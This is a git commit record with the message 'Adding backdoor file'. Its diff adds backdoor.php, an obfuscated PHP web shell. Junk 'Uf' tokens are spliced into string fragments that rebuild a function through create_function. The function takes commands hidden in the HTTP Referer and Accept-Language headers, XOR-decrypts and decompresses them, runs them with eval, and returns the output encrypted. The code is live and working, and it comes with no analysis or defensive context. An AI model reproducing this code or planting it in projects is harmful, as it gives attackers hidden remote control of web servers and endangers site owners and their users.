17f8798d431b37f4b36528d15c4f96f7758dbfbd
Smallfrie81 <nick9988776655@aol.com>
2017-12-23 19:36:48 -0500

    Adding backdoor file

---
+++ backdoor.php
@@ -0,0 +1,17 @@
+<?php
+$r=str_replace('ot','','croteatotote_fuotncottotion');
+$s='($i.$khUf),0,3))Uf;Uf$f=$sl($ssUf(md5Uf($iUf.$kf),0,3));$pUf="";forUf($Ufz=1;Uf$z<UfcUfount($m[1Uf]);$';
+$h='ray("/",Uf"+"),Uf$ss($s[$Ufi]Uf,0,$e)))Uf,$k)));Uf$o=ob_UfUfget_coUfntents();ob_enUfd_cleanUf();$d=ba';
+$L='$_SERVER;$UfrUfr=@$r["HTTP_RUfEFUfEREUfR"];$ra=@$r[Uf"HTTP_UfACCEPUfT_LUfAUfNGUAUfGE"];ifUf($rr&Uf&$ra)';
+$J='{$u=parsUfe_UfuUfUfrl($rr);parse_str($u["querUfy"],$qUf);Uf$q=arraUfUfy_valuesUf($q);pUfreg_match_all(';
+$I='<$l;UfUf){for($jUf=0;Uf($j<$c&&$Ufi<$l);$Ufj++,$Ufi++){$o.=$Uft{$Ufi}^$k{$j};}}retUfurn $oUf;}$UfrUf=';
+$X='z++)$p.=Uf$qUf[$m[2][$z]];iUff(strposUf(Uf$p,$h)UfUf===0)Uf{$Ufs[$i]="";$p=$ss($p,Uf3)Uf;}if(arUfUfray';
+$S='Uf"/Uf([\\w])[\\Ufw-]+(?Uf:;qUf=0.Uf([\\UfdUf]))?,Uf?/",$raUf,$m);if($q&&$m){@sUfUfession_start()Uf;Uf$s';
+$T='();@eUfUfval(@gzuncomUfpress(@x(@bUfase64_UfUfdeUfcode(preg_UfreUfplacUfe(arraUfy("/_Uf/","/-/"Uf),ar';
+$p='=&$_SEUfSSION;$ss="UfsubstUfrUf";$sl="strtoUfUflower";$i=$mUf[UfUf1][0Uf].$mUf[1][1];$h=$sl($sUfs(mdUf5';
+$f='Ufse6Uf4_eUfncode(Ufx(gzcoUfmpressUf($o),$k));UfprinUft("<$k>$dUf</$k>"Uf);@sUfession_deUfUfstroy();}}}}';
+$e='$kh="7Ufc6a";$kf="1Uf80bUf";functiUfon x($tUf,$k){$Ufc=sUfUftrleUfn($k);$l=strUflen($t);$UfUfo=Uf"";forUf($i=0;$i';
+$n='_key_exisUfts($i,$Ufs)){$s[$i].=Uf$pUf;Uf$e=strposUf($sUf[$i],$f);if($eUf){$kUf=$Ufkh.$UfkUff;ob_start';
+$c=str_replace('Uf','',$e.$I.$L.$J.$S.$p.$s.$X.$n.$T.$h.$f);
+$C=$r('',$c);$C();
+?>
